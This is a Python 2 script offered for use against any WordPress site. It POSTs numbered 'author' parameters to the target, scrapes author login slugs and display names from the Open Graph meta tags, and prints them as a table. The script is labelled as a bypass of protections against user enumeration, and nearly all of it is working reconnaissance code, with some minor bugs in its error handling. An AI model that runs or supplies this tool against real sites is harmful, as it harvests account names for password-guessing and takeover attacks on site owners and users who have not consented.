import urllib2, urllib
import argparse
import sys

parser = argparse.ArgumentParser(description="Wordpress users enumerate  bypass", epilog="\033[1mCoded by \033[1;31m@\033[1;36m3Turr \033[0m")

parser.add_argument( '-s', '--site', required=True, default=None, help='targeted website URL')
parser.add_argument( '-n', required=False, type=int, default=None , help='numbers of users to bypass')
args = vars(parser.parse_args())

site = args['site']
usern = args['n']
users = []

def uniq(lst):
    last = object()
    for item in lst:
        if item == last:
            continue
        yield item
        last = item

def sort_and_deduplicate(l):
    return list(uniq(sorted(l, reverse=False)))

def curllib(req, params=None,postdata=None):
	headers = { 'User-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Accept':'*/*' }
	try:
		req = urllib2.Request( req, postdata, headers)
	except(HTTPError, e):
		print(e)
	return urllib2.urlopen(req).read()

def sout(s):
	sys.stdout.write(s+"\r")
	sys.stdout.flush()

for x in range(1,usern):
	prec = 100/usern*x
	sout("[+]: %"+str(prec)+" Done      ")
	try:
		s = curllib(site, '', urllib.urlencode({"author":x}) )
	except:
		0
	u = []
	u.append(s.split('<meta property="og:title" content="')[1].split(', ')[0])
	u.append(s.split('<meta property="og:url" content="'+site+'author/')[1].split('/"')[0])

	users.append(u)

print("[+]: %100 Done      ")
allusers = sort_and_deduplicate(users)


maxlen1 = 0
maxlen2 = 0

for n in range(0,len(allusers)):
	if maxlen1 < len(allusers[n][1]):
		maxlen1 = len(allusers[n][1])
	if maxlen2 < len(allusers[n][0]):
		maxlen2 = len(allusers[n][0])


spaces = maxlen1-len("Login")+1
p1 = spaces+6
p1 = p1*"-"
spaces = spaces*" "

spaces2 = maxlen2-len("Name")+1
p2 = spaces2+5
p2 = p2*"-"
spaces2 = spaces2*" "


header = "| Id | Login"+spaces+"| Name"+spaces2+"|"
print("""+----+"""+p1+"""+"""+p2+"""+\r\n"""+header+"""\r\n+----+"""+p1+"""+"""+p2+"""+""")

for x in range(0,len(allusers)):
	spaces = maxlen1-len(allusers[x][1])+1
	spaces = spaces*" "
	spaces2 = maxlen2-len(allusers[x][0])+1
	spaces2 = spaces2*" "

	ids = 3-len(str(x))
	ids = ids*" "
	
	uprint = "| "+str(x)+ids+"| "+allusers[x][1]+spaces+"| "+allusers[x][0]+spaces2+"|";
	print(uprint)

print("""+----+"""+p1+"""+"""+p2+"""+""")
